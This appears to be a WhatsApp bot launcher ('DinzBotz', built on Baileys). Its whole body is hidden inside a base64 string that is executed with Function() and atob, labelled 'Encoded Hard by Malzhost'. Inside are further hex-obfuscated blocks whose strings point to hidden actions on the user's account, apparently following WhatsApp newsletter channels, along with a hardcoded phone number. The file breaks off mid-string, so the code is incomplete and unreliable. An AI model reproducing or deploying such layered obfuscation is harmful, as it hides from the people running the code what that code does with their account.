
// Encoded Hard by Malzhost
(function(){
  const decode = Function("return decodeURIComponent(escape(atob('cmVxdWlyZSgnLi9zZXR0aW5ncycpCmNvbnN0IHsgbW9kdWwgfSA9IHJlcXVpcmUoJy4vbW9kdWxlJyk7CmNvbnN0IG1vbWVudCA9IHJlcXVpcmUoJ21vbWVudC10aW1lem9uZScpOwpjb25zdCB7IGJhaWxleXMsIGJvb20sIGNoYWxrLCBmcywgZmlnbGV0LCBGaWxlVHlwZSwgcGF0aCwgcGlubywgcHJvY2VzcywgUGhvbmVOdW1iZXIsIGF4aW9zLCB5YXJncywgXyB9ID0gbW9kdWw7CmNvbnN0IHsgQm9vbSB9ID0gYm9vbQpjb25zdCB7CglkZWZhdWx0OiBYZW9uQm90SW5jQ29ubmVjdCwKCUJ1ZmZlckpTT04sCglwcm9jZXNzZWRNZXNzYWdlcywKCVBIT05FTlVNQkVSX01DQywKCWluaXRJbk1lbW9yeUtleVN0b3JlLAoJRGlzY29ubmVjdFJlYXNvbiwKCUFueU1lc3NhZ2VDb250ZW50LAogICAgICAgIG1ha2VJbk1lbW9yeVN0b3JlLAoJdXNlTXVsdGlGaWxlQXV0aFN0YXRlLAoJZGVsYXksCglmZXRjaExhdGVzdEJhaWxleXNWZXJzaW9uLAoJZ2VuZXJhdGVGb3J3YXJkTWVzc2FnZUNvbnRlbnQsCiAgICBwcmVwYXJlV0FNZXNzYWdlTWVkaWEsCiAgICBnZW5lcmF0ZVdBTWVzc2FnZUZyb21Db250ZW50LAogICAgZ2VuZXJhdGVNZXNzYWdlSUQsCiAgICBkb3dubG9hZENvbnRlbnRGcm9tTWVzc2FnZSwKICAgIGppZERlY29kZSwKICAgIG1ha2VDYWNoZWFibGVTaWduYWxLZXlTdG9yZSwKICAgIGdldEFnZ3JlZ2F0ZVZvdGVzSW5Qb2xsTWVzc2FnZSwKICAgIHByb3RvCn0gPSByZXF1aXJlKCJAd2hpc2tleXNvY2tldHMvYmFpbGV5cyIpCmNvbnN0IGNmb250cyA9IHJlcXVpcmUoJ2Nmb250cycpOwpjb25zdCB7IGNvbG9yLCBiZ2NvbG9yIH0gPSByZXF1aXJlKCcuL2xpYi9jb2xvcicpCmNvbnN0IHsgVGVsZWdyYVBoIH0gPSByZXF1aXJlKCcuL2xpYi91cGxvYWRlcicpCmNvbnN0IE5vZGVDYWNoZSA9IHJlcXVpcmUoIm5vZGUtY2FjaGUiKQpjb25zdCBjYW52YWZ5ID0gcmVxdWlyZSgiY2FudmFmeSIpCmNvbnN0IHsgcGFyc2VQaG9uZU51bWJlciB9ID0gcmVxdWlyZSgibGlicGhvbmVudW1iZXItanMiKQpsZXQgX3dlbGNvbWUgPSBKU09OLnBhcnNlKGZzLnJlYWRGaWxlU3luYygnLi9kYXRhYmFzZS93ZWxjb21lLmpzb24nKSkKbGV0IF9sZWZ0ID0gSlNPTi5wYXJzZShmcy5yZWFkRmlsZVN5bmMoJy4vZGF0YWJhc2UvbGVmdC5qc29uJykpCmNvbnN0IG1ha2VXQVNvY2tldCA9IHJlcXVpcmUoIkB3aGlza2V5c29ja2V0cy9iYWlsZXlzIikuZGVmYXVsdApjb25zdCBQaW5vID0gcmVxdWlyZSgicGlubyIpCmNvbnN0IHJlYWRsaW5lID0gcmVxdWlyZSgicmVhZGxpbmUiKQpjb25zdCBjb2xvcnMgPSByZXF1aXJlKCdjb2xvcnMnKQpjb25zdCB7IHN0YXJ0IH0gPSByZXF1aXJlKCcuL2xpYi9zcGlubmVyJykKY29uc3QgeyB1bmNhY2hlLCBub2NhY2hlIH0gPSByZXF1aXJlKCcuL2xpYi9sb2FkZXInKQpjb25zdCB7IGltYWdlVG9XZWJwLCB2aWRlb1RvV2VicCwgd3JpdGVFeGlmSW1nLCB3cml0ZUV4aWZWaWQgfSA9IHJlcXVpcmUoJy4vbGliL2V4aWYnKQpjb25zdCB7IHNtc2csIGlzVXJsLCBnZW5lcmF0ZU1lc3NhZ2VUYWcsIGdldEJ1ZmZlciwgZ2V0U2l6ZU1lZGlhLCBmZXRjaEpzb24sIGF3YWl0LCBzbGVlcCwgcmVTaXplIH0gPSByZXF1aXJlKCcuL2xpYi9teWZ1bmMnKQoKY29uc3QgcHJlZml4ID0gJy4nCmxldCBwaG9uZU51bWJlciA9ICI5MTY5MDkxMzcyMTMiCmdsb2JhbC5kYiA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL2RhdGFiYXNlL2RhdGFiYXNlLmpzb24nKSkKaWYgKGdsb2JhbC5kYikgZ2xvYmFsLmRiID0gewpzdGlja2VyOiB7fSwKZGF0YWJhc2U6IHt9LCAKZ3JvdXBzOiB7fSwgCmdhbWU6IHt9LApvdGhlcnM6IHt9LAp1c2Vyczoge30sCmNoYXRzOiB7fSwKc2V0dGluZ3M6IHt9LAouLi4oZ2xvYmFsLmRiIHx8IHt9KQp9CmNvbnN0IHBhaXJpbmdDb2RlID0gISFwaG9uZU51bWJlciB8fCBwcm9jZXNzLmFyZ3YuaW5jbHVkZXMoIi0tcGFpcmluZy1jb2RlIikKCmNvbnN0IHVzZU1vYmlsZSA9IHByb2Nlc3MuYXJndi5pbmNsdWRlcygiLS1tb2JpbGUiKQpjb25zdCBvd25lciA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL1BSRU1JVU0vb3duZXIuanNvbicpKQoKY29uc3Qgc3RvcmUgPSBtYWtlSW5NZW1vcnlTdG9yZSh7IGxvZ2dlcjogcGlubygpLmNoaWxkKHsgbGV2ZWw6ICdzaWxlbnQnLCBzdHJlYW06ICdzdG9yZScgfSkgfSkKY29uc3QgcmwgPSByZWFkbGluZS5jcmVhdGVJbnRlcmZhY2UoeyBpbnB1dDogcHJvY2Vzcy5zdGRpbiwgb3V0cHV0OiBwcm9jZXNzLnN0ZG91dCB9KQoKY29uc3QgcXVlc3Rpb24gPSAodGV4dCkgPT4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHJsLnF1ZXN0aW9uKHRleHQsIHJlc29sdmUpKQpyZXF1aXJlKCcuL0RpbnpJRC5qcycpCm5vY2FjaGUoJy4uL0RpbnpJRC5qcycsIG1vZHVsZSA9PiBjb25zb2xlLmxvZyhjb2xvcignWyBDSEFOR0UgXScsICdncmVlbicpLCBjb2xvcihgJyR7bW9kdWxlfSdgLCAnZ3JlZW4nKSwgJ1VwZGF0ZWQnKSkKcmVxdWlyZSgnLi9pbmRleC5qcycpCm5vY2FjaGUoJy4uL2luZGV4LmpzJywgbW9kdWxlID0+IGNvbnNvbGUubG9nKGNvbG9yKCdbIENIQU5HRSBdJywgJ2dyZWVuJyksIGNvbG9yKGAnJHttb2R1bGV9J2AsICdncmVlbicpLCAnVXBkYXRlZCcpKQoKYXN5bmMgZnVuY3Rpb24gRGluekJvdHpJbmQoKSB7Cgljb25zdCB7ICBzYXZlQ3JlZHMsIHN0YXRlIH0gPSBhd2FpdCB1c2VNdWx0aUZpbGVBdXRoU3RhdGUoYC4vJHtzZXNzaW9uTmFtZX1gKQoJY29uc3QgbXNnUmV0cnlDb3VudGVyQ2FjaGUgPSBuZXcgTm9kZUNhY2hlKCkKCmNvbnN0IERpbnpCb3R6ID0gbWFrZVdBU29ja2V0KHsKICAgICAgbG9nZ2VyOiBwaW5vKHsgbGV2ZWw6ICJzaWxlbnQiIH0pLAogICAgICBwcmludFFSSW5UZXJtaW5hbDogZmFsc2UsCiAgICAgIGF1dGg6IHN0YXRlLAogICAgICBjb25uZWN0VGltZW91dE1zOiA2MDAwMCwKICAgICAgZGVmYXVsdFF1ZXJ5VGltZW91dE1zOiAwLAogICAgICBrZWVwQWxpdmVJbnRlcnZhbE1zOiAxMDAwMCwKICAgICAgZW1pdE93bkV2ZW50czogdHJ1ZSwKICAgICAgZmlyZUluaXRRdWVyaWVzOiB0cnVlLAogICAgICBnZW5lcmF0ZUhpZ2hRdWFsaXR5TGlua1ByZXZpZXc6IHRydWUsCiAgICAgIHN5bmNGdWxsSGlzdG9yeTogdHJ1ZSwKICAgICAgbWFya09ubGluZU9uQ29ubmVjdDogdHJ1ZSwKICAgICAgYnJvd3NlcjogWyJVYnVudHUiLCAiQ2hyb21lIiwgIjIwLjAuMDQiXSwKCiAgICAgIHBhdGNoTWVzc2FnZUJlZm9yZVNlbmRpbmc6IChtZXNzYWdlKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IHJlcXVpcmVzUGF0Y2ggPSAhISgKICAgICAgICAgICAgICAgIG1lc3NhZ2UuYnV0dG9uc01lc3NhZ2UgfHwKICAgICAgICAgICAgICAgIG1lc3NhZ2UudGVtcGxhdGVNZXNzYWdlIHx8CiAgICAgICAgICAgICAgICBtZXNzYWdlLmxpc3RNZXNzYWdlCiAgICAgICAgICAgICk7CiAgICAgICAgICAgIGlmIChyZXF1aXJlc1BhdGNoKSB7CiAgICAgICAgICAgICAgICBtZXNzYWdlID0gewogICAgICAgICAgICAgICAgICAgIHZpZXdPbmNlTWVzc2FnZTogewogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlQ29udGV4dEluZm86IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXZpY2VMaXN0TWV0YWRhdGFWZXJzaW9uOiAyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRldmljZUxpc3RNZXRhZGF0YToge30sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLi4ubWVzc2FnZSwKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gbWVzc2FnZTsKICAgICAgICB9LAogICAgICBhdXRoOiB7CiAgICAgICAgIGNyZWRzOiBzdGF0ZS5jcmVkcywKICAgICAgICAga2V5czogbWFrZUNhY2hlYWJsZVNpZ25hbEtleVN0b3JlKHN0YXRlLmtleXMsIHBpbm8oeyBsZXZlbDogImZhdGFsIiB9KS5jaGlsZCh7IGxldmVsOiAiZmF0YWwiIH0pKSwKICAgICAgfSwKY29ubmVjdFRpbWVvdXRNczogNjAwMDAsCmRlZmF1bHRRdWVyeVRpbWVvdXRNczogMCwKa2VlcEFsaXZlSW50ZXJ2YWxNczogMTAwMDAsCmVtaXRPd25FdmVudHM6IHRydWUsCmZpcmVJbml0UXVlcmllczogdHJ1ZSwKZ2VuZXJhdGVIaWdoUXVhbGl0eUxpbmtQcmV2aWV3OiB0cnVlLApzeW5jRnVsbEhpc3Rvcnk6IHRydWUsCm1hcmtPbmxpbmVPbkNvbm5lY3Q6IHRydWUsCiAgICAgIGdldE1lc3NhZ2U6IGFzeW5jIChrZXkpID0+IHsKICAgICAgICAgICAgaWYgKHN0b3JlKSB7CiAgICAgICAgICAgICAgICBjb25zdCBtc2cgPSBhd2FpdCBzdG9yZS5sb2FkTWVzc2FnZShrZXkucmVtb3RlSmlkLCBrZXkuaWQpCiAgICAgICAgICAgICAgICByZXR1cm4gbXNnLm1lc3NhZ2UgfHwgdW5kZWZpbmVkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIGNvbnZlcnNhdGlvbjogIllvaW1peWEgRGlzaW5pISIKICAgICAgICAgICAgfQogICAgICAgIH0sCiAgICAgIG1zZ1JldHJ5Q291bnRlckNhY2hlLCAvLyBSZXNvbHZlIHdhaXRpbmcgbWVzc2FnZXMKICAgICAgZGVmYXVsdFF1ZXJ5VGltZW91dE1zOiB1bmRlZmluZWQsIC8vIGZvciB0aGlzIGlzc3VlcyBodHRwczovL2dpdGh1Yi5jb20vV2hpc2tleVNvY2tldHMvQmFpbGV5cy9pc3N1ZXMvMjc2CiAgIH0pCiAgIApjb25zdCBfMHgyN2UyOWMgPSBfMHg0N2ZkOwooZnVuY3Rpb24gKF8weDM0YjE2MSwgXzB4NTU5OGNhKSB7CiAgICBjb25zdCBfMHgyNzFkMDQgPSBfMHg0N2ZkLCBfMHg0YzMxZGIgPSBfMHgzNGIxNjEoKTsKICAgIHdoaWxlICghIVtdKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3QgXzB4MmUzNDA3ID0gLXBhcnNlSW50KF8weDI3MWQwNCgweDE4YykpIC8gKC0weGQgKiAweDMgKyAtMHgxZjk0ICsgMHgxZmJjKSAqICgtcGFyc2VJbnQoXzB4MjcxZDA0KDB4MThkKSkgLyAoMHgxOTEzICsgLTB4YzUyICsgMHhjYmYgKiAtMHgxKSkgKyBwYXJzZUludChfMHgyNzFkMDQoMHgxOTgpKSAvICgweDggKiAweDE1MiArIDB4MWI2OCArIC0weDI1ZjUpICogKHBhcnNlSW50KF8weDI3MWQwNCgweDE3ZSkpIC8gKDB4MWFiMiArIDB4NTkzICsgLTB4MjA0MSkpICsgLXBhcnNlSW50KF8weDI3MWQwNCgweDE4OCkpIC8gKDB4NTE3ICogMHgxICsgMHgyNDE5ICogMHgxICsgMHg0OTMgKiAtMHg5KSAqIChwYXJzZUludChfMHgyNzFkMDQoMHgxOTUpKSAvICgtMHgzZCAqIC0weDY4ICsgLTB4MjRhNCArIDB4YTkgKiAweDEyKSkgKyAtcGFyc2VJbnQoXzB4MjcxZDA0KDB4MTk0KSkgLyAoMHg2NTcgKiAtMHgxICsgLTB4YTVmICsgMHgxMGJkICogMHgxKSArIC1wYXJzZUludChfMHgyNzFkMDQoMHgxODApKSAvICgtMHg5YmEgKyAweDE5OGUgKyAtMHhmY2MpICogKC1wYXJzZUludChfMHgyNzFkMDQoMHgxOTEpKSAvICgweDM1YiAqIDB4NiArIC0weGVmICogMHgyNSArIC0weDIgKiAtMHg3MzkpKSArIC1wYXJzZUludChfMHgyNzFkMDQoMHgxOTIpKSAvICgweDEzMzEgKyAweDE1NzkgKyAtMHg0MSAqIDB4YTApICsgcGFyc2VJbnQoXzB4MjcxZDA0KDB4MTgzKSkgLyAoLTB4OGVkICsgMHgzICogMHg1MSArIC0weDgwNSAqIC0weDEpOwogICAgICAgICAgICBpZiAoXzB4MmUzNDA3ID09PSBfMHg1NTk4Y2EpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgXzB4NGMzMWRiWydwdXNoJ10oXzB4NGMzMWRiWydzaGlmdCddKCkpOwogICAgICAgIH0gY2F0Y2ggKF8weDFhMDgxYikgewogICAgICAgICAgICBfMHg0YzMxZGJbJ3B1c2gnXShfMHg0YzMxZGJbJ3NoaWZ0J10oKSk7CiAgICAgICAgfQogICAgfQp9KF8weDQ2MDEsIC0weDlhMyAqIDB4NDcgKyAtMHgzZGRlYSAqIDB4MSArIDB4ZjcgKiAweGE5NykpOwppZiAoIURpbnpCb3R6W18weDI3ZTI5YygweDE4YSldW18weDI3ZTI5YygweDE3ZCldW18weDI3ZTI5YygweDE4YildKSB7CiAgICBjb25zdCBwaG9uZU51bWJlciA9IGF3YWl0IHF1ZXN0aW9uKF8weDI3ZTI5YygweDE5MCkgKyBfMHgyN2UyOWMoMHgxODUpICsgXzB4MjdlMjljKDB4MTk2KSArIF8weDI3ZTI5YygweDE4NCkgKyBfMHgyN2UyOWMoMHgxOGUpKTsKICAgIGxldCBjdXN0b20gPSBfMHgyN2UyOWMoMHgxN2YpOwogICAgY29uc3QgY29kZSA9IGF3YWl0IERpbnpCb3R6W18weDI3ZTI5YygweDE4ZikgKyBfMHgyN2UyOWMoMHgxOTcpXShwaG9uZU51bWJlciwgY3VzdG9tKTsKICAgIGNvbnNvbGVbXzB4MjdlMjljKDB4MTg5KV0oY2hhbGtbXzB4MjdlMjljKDB4MTg3KV0oXzB4MjdlMjljKDB4MTkzKSkoXzB4MjdlMjljKDB4MTgyKSArIF8weDI3ZTI5YygweDE4NikgKyBfMHgyN2UyOWMoMHgxODEpICsgY29kZSkpOwp9CmZ1bmN0aW9uIF8weDQ3ZmQoXzB4MWFhODQ2LCBfMHgxZjliODUpIHsKICAgIGNvbnN0IF8weDNmM2YwNyA9IF8weDQ2MDEoKTsKICAgIHJldHVybiBfMHg0N2ZkID0gZnVuY3Rpb24gKF8weDMyNDM1YywgXzB4ZWY0MTVlKSB7CiAgICAgICAgXzB4MzI0MzVjID0gXzB4MzI0MzVjIC0gKDB4NzA5ICogMHgxICsgMHgyZDUgKiAtMHgzICsgMHgyZjMpOwogICAgICAgIGxldCBfMHgzNTEwZmEgPSBfMHgzZjNmMDdbXzB4MzI0MzVjXTsKICAgICAgICByZXR1cm4gXzB4MzUxMGZhOwogICAgfSwgXzB4NDdmZChfMHgxYWE4NDYsIF8weDFmOWI4NSk7Cn0KZnVuY3Rpb24gXzB4NDYwMSgpIHsKICAgIGNvbnN0IF8weDM5MGQxMSA9IFsKICAgICAgICAnSVJJTkdceDIwTFVceDIwXScsCiAgICAgICAgJ2tleXdvcmQnLAogICAgICAgICcxNjI2MEJnb2RwVScsCiAgICAgICAgJ2xvZycsCiAgICAgICAgJ2F1dGhTdGF0ZScsCiAgICAgICAgJ3JlZ2lzdGVyZWQnLAogICAgICAgICc2Nzk3ampTaWJYJywKICAgICAgICAnMTZqQkNTcUMnLAogICAgICAgICdceDIwUmVjb2RlXHgyMDpceDBhJywKICAgICAgICAncmVxdWVzdFBhaScsCiAgICAgICAgJ01hc3VrYW5ceDIwTm8nLAogICAgICAgICcxMzU5OWd4alhuRycsCiAgICAgICAgJzE4NzkzNTB0SEptdWYnLAogICAgICAgICdhcXVhJywKICAgICAgICAnMzI0OTM5M0libVVtbycsCiAgICAgICAgJzgxME53SE15aCcsCiAgICAgICAgJ2t0aWZceDIwQXdhbGknLAogICAgICAgICdyaW5nQ29kZScsCiAgICAgICAgJzE0NEJCbVFLeicsCiAgICAgICAgJ2NyZWRzJywKICAgICAgICAnNTY4NFJRandTTCcsCiAgICAgICAgJ1lPSU1JWUFBJywKICAgICAgICAnMzYwQ0haUEdCJywKICAgICAgICAnXHgyMDpceDIwJywKICAgICAgICAnXHgwYVtceDIwQ09ERVx4MjBQQScsCiAgICAgICAgJzEyNTU3Nzg3Qm1TSXppJywKICAgICAgICAnXHgyMERlbmdhblx4MjA2MicsCiAgICAgICAgJ21lclx4MjBZYW5nXHgyMEEnCiAgICBdOwogICAgXzB4NDYwMSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICByZXR1cm4gXzB4MzkwZDExOwogICAgfTsKICAgIHJldHVybiBfMHg0NjAxKCk7Cn0KICAgIHN0b3JlLmJpbmQoRGluekJvdHouZXYpCiAgIApmdW5jdGlvbiBfMHgyNzNlKF8weDU3MTcyNywgXzB4MThjZmQzKSB7CiAgICBjb25zdCBfMHgyMGFlODIgPSBfMHgyY2QzKCk7CiAgICByZXR1cm4gXzB4MjczZSA9IGZ1bmN0aW9uIChfMHgyMGNkMjksIF8weDQwNDIwNCkgewogICAgICAgIF8weDIwY2QyOSA9IF8weDIwY2QyOSAtICgtMHgxMjYxICsgMHg1ZDkgKyAtMHhjMSAqIC0weDEyKTsKICAgICAgICBsZXQgXzB4MzJhZmJhID0gXzB4MjBhZTgyW18weDIwY2QyOV07CiAgICAgICAgcmV0dXJuIF8weDMyYWZiYTsKICAgIH0sIF8weDI3M2UoXzB4NTcxNzI3LCBfMHgxOGNmZDMpOwp9CmZ1bmN0aW9uIF8weDJjZDMoKSB7CiAgICBjb25zdCBfMHgxZDc4NTEgPSBbCiAgICAgICAgJ2ljYXRpb25zJywKICAgICAgICAnbmljVkEnLAogICAgICAgICczMzc0NzM3M0BuJywKICAgICAgICAnXHgyMEFnYWluXHgyMEFuZCcsCiAgICAgICAgJzI2MTEwNzE0QG4nLAogICAgICAgICd5Snp5aScsCiAgICAgICAgJzM5MDcwODU5QG4nLAogICAgICAgICdiYWRTZXNzaW9uJywKICAgICAgICAnTG9zdCcsCiAgICAgICAgJ0ZvbGxvdycsCiAgICAgICAgJ2NEZkhhJywKICAgICAgICAncmVjZWl2ZWRQZScsCiAgICAgICAgJ2Jsb2NrJywKICAgICAgICAnRGlueklEJywKICAgICAgICAnXHgyMFJ1bi4nLAogICAgICAgICdPTnlQYicsCiAgICAgICAgJ2VceDIwU2Vzc2lvblx4MjAnLAogICAgICAgICdORFdtQicsCiAgICAgICAgJ1Jlc3RhcnRceDIwUmUnLAogICAgICAgICdhc29uOlx4MjAnLAogICAgICAgICc2NDQwMzMxMUBuJywKICAgICAgICAnSWF0clgnLAogICAgICAgICd1aXJlZCcsCiAgICAgICAgJ1dRdm1kJywKICAgICAgICAnXHgyMFJlcGxhY2VkLCcsCiAgICAgICAgJ2FuZFx4MjBTY2FuXHgyMEEnLAogICAgICAgICdlcnJvcicsCiAgICAgICAgJ0Nvbm5lY3Rpb24nLAogICAgICAgICdceDIwQW5vdGhlclx4MjBOJywKICAgICAgICAnV2hpdGVCcmlnaCcsCiAgICAgICAgJzc1ODhBVHl2bVEnLAogICAgICAgICcyMHN1Y0NraicsCiAgICAgICAgJ3RpbWVkT3V0JywKICAgICAgICAnMTIwMzYzNDE4OCcsCiAgICAgICAgJ3F1aXJlZCxceDIwUmUnLAogICAgICAgICd0cmFuc3BhcmVuJywKICAgICAgICAnaVpidWknLAogICAgICAgICdIQ1lYRScsCiAgICAgICAgJ1Nlc3Npb25ceDIwRmknLAogICAgICAgICdyc3QnLAogICAgICAgICdnYWluJywKICAgICAgICAnb3BlbicsCiAgICAgICAgJzN0bEVqWmknLAogICAgICAgICdvdXRwdXQnLAogICAgICAgICdjb25uZWN0aW9uJywKICAgICAgICAnVk1UclAnLAogICAgICAgICc3NTgxMTI1MEBuJywKICAgICAgICAnQmFkXHgyMFNlc3NpbycsCiAgICAgICAgJ3N0YXR1c0NvZGUnLAogICAgICAgICdPSkJSeCcsCiAgICAgICAgJ0l2RVFMJywKICAgICAgICAnMTc4OTg1ODVAbicsCiAgICAgICAgJzM3OTUwMDBQZlZtWFonLAogICAgICAgICdsZWZ0JywKICAgICAgICAnRXJyb3JceDIwaW5ceDIwQycsCiAgICAgICAgJzIxNjA1NzQ5bGFac3VmJywKICAgICAgICAnamtDaVMnLAogICAgICAgICdnLi4uJywKICAgICAgICAnbkJoS0UnLAogICAgICAgICc2NTcxNzY0Vktjd1h0JywKICAgICAgICAnLnVwZGF0ZScsCiAgICAgICAgJ25ceDIwRmlsZSxceDIwUGwnLAogICAgICAgICcxMjAzNjMzOTk5JywKICAgICAgICAnZy4uLi4nLAogICAgICAgICd1alBFcycsCiAgICAgICAgJzEyMDM2MzM5OTInLAogICAgICAgICdmV3pNYScsCiAgICAgICAgJ2VceDIwQ3VycmVudFx4MjAnLAogICAgICAgICdceDIwTG9zdFx4MjBmcm9tJywKICAgICAgICAnbmV3c2xldHRlcicsCiAgICAgICAgJ1RJVkd2JywKICAgICAgICAnZ096ZHUnLAogICAgICAgICdJWUlmVycsCiAgICAgICAgJ25kaW5nTm90aWYnLAogICAgICAgICdjbG9zZScsCiAgICAgICAgJzcwMzI0MTc5QG4nLAogICAgICAgICd1YVBMcycsCiAgICAgICAgJ3Jlc3RhcnRSZXEnLAogICAgICAgICdFemZQWicsCiAgICAgICAgJ1x4MjBjbG9zZWQsXHgyMHInLAogICAgICAgICdlWXZsVCcsCiAgICAgICAgJ1x4MjBPcGVuZWQsXHgyMFAnLAogICAgICAgICdXVHNpTicsCiAgICAgICAgJ2luZy4uLicsCiAgICAgICAgJ1V0c3d2JywKICAgICAgICAnVW5rbm93blx4MjBEaScsCiAgICAgICAgJ2dlZFx4MjBPdXQsXHgyMFAnLAogICAgICAgICczMjk0MjQwelhFcVBtJywKICAgICAgICAnQ2xvc2VkJywKICAgICAgICAnZXdzbGV0dGVyJywKICAgICAgICAnZ3llY24nLAogICAgICAgICdCeGdseScsCiAgICAgICAgJzEyMDM2MzQxNzcnLAogICAgICAgICc1NzE4cHBNbG9sJywKICAgICAgICAnWWVsbG93JywKICAgICAgICAnZWFzZVx4MjBEZWxldCcsCiAgICAgICAgJzAxNzk4MjE3QG4nLAogICAgICAgICcxNTMzMzMyOUBuJywKICAgICAgICAnR2pSWUYnLAogICAgICAgICdtTVJqdScsCiAgICAgICAgJ1JtdkZWJywKICAgICAgICAnQmRmRXInLAogICAgICAgICcxMjAzNjM0MjEzJywKICAgICAgICAnaFFYTEUnLAogICAgICAgICdvbm5lY3Rpb24uJywKICAgICAgICAnMTIwMzYzNDIwMicsCiAgICAgICAgJzg4MTkzNTQzQG4nLAogICAgICAgICcxMjAzNjMzNzkxJywKICAgICAgICAnQUJwZkknLAogICAgICAgICdib2djWCcsCiAgICAgICAgJ3Zra2ZsJywKICAgICAgICAnc3RhcnRpbmcuLicsCiAgICAgICAgJzk5NDdpckRLZG0nLAogICAgICAgICdsZWFzZVx4MjBDbG9zJywKICAgICAgICAndHJ1ZScsCiAgICAgICAgJ1x4MGFceDBhTWVuZ2h1YnUnLAogICAgICAgICdceDIwUmVjb25uZWN0JywKICAgICAgICAndUJ2cGMnLAogICAgICAgICd1cGRhdGVceDIwJywKICAgICAgICAnNjQyMDU4NHdxbnl3aScsCiAgICAgICAgJzEyMDM2MzQwMTMnLAogICAgICAgICdwdHFZUicsCiAgICAgICAgJ2xwanhaJywKICAgICAgICAnUmVwbGFjZWQnLAogICAgICAgICdobmJZRycsCiAgICAgICAgJ2V3XHgyMFNlc3Npb24nLAogICAgICAgICd5WkhkdycsCiAgICAgICAgJ25na2FuLi4uJywKICAgICAgICAnb0p4ZkEnLAogICAgICAgICdsb2cnLAogICAgICAgICdzY29ubmVjdFJlJywKICAgICAgICAncm9VU0QnLAogICAgICAgICdlY29ubmVjdGluJywKICAgICAgICAnXHgyMFNlcnZlcixceDIwcicsCiAgICAgICAgJ1x4MjBUaW1lZE91dCwnLAogICAgICAgICdsb2dnZWRPdXQnLAogICAgICAgICd5ZWxsb3cnLAogICAgICAgICdmYWxzZScsCiAgICAgICAgJ09EcWtCJywKICAgICAgICAnc2F5JywKICAgICAgICAnNjZPUVBId3QnLAogICAgICAgICcxMjAzNjM0MDM4JywKICAgICAgICAnY29ubmVjdGluZycsCiAgICAgICAgJ0RldmljZVx4MjBMb2cnLAogICAgICAgICdsZWFzZVx4MjBTY2FuJwogICAgXTsKICAgIF8weDJjZDMgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgcmV0dXJuIF8weDFkNzg1MTsKICAgIH07CiAgICByZXR1cm4gXzB4MmNkMygpOwp9CmNvbnN0IF8weDMzZjViZSA9IF8weDI3M2U7CihmdW5jdGlvbiAoXzB4MTdkNWQ3LCBfMHgzYmIzOTMpIHsKICAgIGNvbnN0IF8weDE3N2Q4OCA9IF8weDI3M2UsIF8weDU5NGY1NiA9IF8weDE3ZDVkNygpOwogICAgd2hpbGUgKCEhW10pIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCBfMHgzODgyZWIgPSAtcGFyc2VJbnQoXzB4MTc3ZDg4KDB4MTdiKSkgLyAoMHg4ZjEgKyAtMHgxOGU5ICsgMHhmZjkpICogKC1wYXJzZUludChfMHgxNzdkODgoMHgxOTcpKSAvICgweGEzNiArIDB4MjYgKiAweDU2ICsgLTB4MTZmOCkpICsgcGFyc2VJbnQoXzB4MTc3ZDg4KDB4MTM1KSkgLyAoMHgxOGVjICsgLTB4MTU5MiArIC0weDM1NykgKiAocGFyc2VJbnQoXzB4MTc3ZDg4KDB4MTNmKSkgLyAoLTB4MTYgKiAtMHgxYWYgKyAtMHgxYmZkICsgMHgzMDMgKiAtMHgzKSkgKyBwYXJzZUludChfMHgxNzdkODgoMHgxNjIpKSAvICgweDRiNCArIC0weGJiICogLTB4MjUgKyAtMHgxZmI2KSArIC1wYXJzZUludChfMHgxNzdkODgoMHgxNjgpKSAvICgweDEgKiAtMHgxYjdhICsgLTB4MjA5MyArIC0weDg5NSAqIC0weDcpICogKC1wYXJzZUludChfMHgxNzdkODgoMHgxMjkpKSAvICgweDFmYTQgKyAweGUgKiAtMHhjNSArIC0weDE0ZDcpKSArIHBhcnNlSW50KF8weDE3N2Q4OCgweDE4MikpIC8gKDB4MjkgKiAtMHg4MyArIC0weDE1YyArIDB4MTY1ZikgKyBwYXJzZUludChfMHgxNzdkODgoMHgxNDYpKSAvICgweDEgKiAweDI2MyArIC0weDEgKiAtMHg3OGIgKyAtMHgxMSAqIDB4OTUpICsgLXBhcnNlSW50KF8weDE3N2Q4OCgweDEyYSkpIC8gKC0weDIgKiAweDRiYyArIC0weDY5ICogLTB4NTIgKyAtMHgxODIwKSAqIChwYXJzZUludChfMHgxNzdkODgoMHgxNDIpKSAvICgweDUgKiAtMHg0NiArIC0weDRlNiArIDB4MTQzICogMHg1KSk7CiAgICAgICAgICAgIGlmIChfMHgzODgyZWIgPT09IF8weDNiYjM5MykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBfMHg1OTRmNTZbJ3B1c2gnXShfMHg1OTRmNTZbJ3NoaWZ0J10oKSk7CiAgICAgICAgfSBjYXRjaCAoXzB4NWRjOTVmKSB7CiAgICAgICAgICAgIF8weDU5NGY1NlsncHVzaCddKF8weDU5NGY1Nlsnc2hpZnQnXSgpKTsKICAgICAgICB9CiAgICB9Cn0oXzB4MmNkMywgLTB4ZWE3ZTIgKyAweDg2OWUxICsgMHgxICogMHhlZmRhOSksIERpbnpCb3R6WydldiddWydvbiddKF8weDMzZjViZSgweDEzNykgKyBfMHgzM2Y1YmUoMHgxNDcpLCBhc3luYyBfMHgzYjMxNTcgPT4gewogICAgY29uc3QgXzB4MzdkNDEwID0gXzB4MzNmNWJlLCBfMHgxO